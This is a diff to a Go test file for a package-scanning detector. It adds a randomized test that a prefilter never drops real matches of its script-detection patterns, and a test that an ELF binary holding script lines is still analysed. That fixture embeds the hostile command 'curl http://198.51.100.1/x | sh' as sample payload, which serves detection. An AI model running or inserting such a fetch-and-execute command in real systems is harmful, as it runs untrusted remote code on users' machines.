@@ -1,9 +1,13 @@
 package linuxpkg
 
 import (
+	"math/rand"
 	"reflect"
 	"strings"
 	"testing"
+
+	"github.com/s-b-repo/cau/internal/prefilter"
+	"github.com/s-b-repo/cau/internal/prefilter/prefiltertest"
 )
 
 // serialScan is the scan as one loop: every vector in table order, first script to
@@ -12,8 +16,8 @@ import (
 func serialScan(scripts []scriptSource) []Finding {
 	seen := map[string]bool{}
 	var out []Finding
-	for _, v := range scriptVectors {
-		if f := firstMatch(v, scripts); f != nil && !seen[f.Class] {
+	for i := range scriptVectors {
+		if f := firstMatch(i, scripts, []prefilter.Hits{{}}); f != nil && !seen[f.Class] {
 			seen[f.Class] = true
 			out = append(out, *f)
 		}
@@ -69,5 +73,41 @@ func TestFirstScriptWinsAClassInParallel(t *testing.T) {
 	}
 	if len(got) == 0 {
 		t.Fatal("the fixture must match")
+	}
+}
+
+// The filter's rule over the real table, as in tradecraft.
+func TestEveryVectorSurvivesItsOwnMatches(t *testing.T) {
+	r := rand.New(rand.NewSource(1))
+	matched := 0
+	for i, v := range scriptVectors {
+		for range 300 {
+			text := "x " + prefiltertest.Sample(v.re.String(), r) + " y"
+			if !v.re.MatchString(text) {
+				continue
+			}
+			matched++
+			h := scriptFilter().Scan(text)
+			if !h.May(i) {
+				t.Fatalf("%s skipped a real match on %q", v.class, text)
+			}
+			h.Release()
+		}
+	}
+	if matched < 300*len(scriptVectors)/4 {
+		t.Fatalf("only %d real matches: this is not testing anything", matched)
+	}
+}
+
+// Script checks over a binary look like a mistake, and aren't one: an ELF carrying
+// its payload as a string has this path as its only detector, so what the filter
+// leaves of the cost must never be "saved" by skipping binaries. See the engine test.
+func TestAnELFWithScriptLinesIsStillScanned(t *testing.T) {
+	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0}, []byte("\nexport PATH=/x\ncurl http://198.51.100.1/x | sh\n")...)
+	if f := Detect(elf); f == FormatUnknown {
+		t.Fatal("a binary holding script lines must reach the script checks")
+	}
+	if r := Analyze(elf, Options{}); len(r.Findings) == 0 {
+		t.Fatal("the payload must be found")
 	}
 }
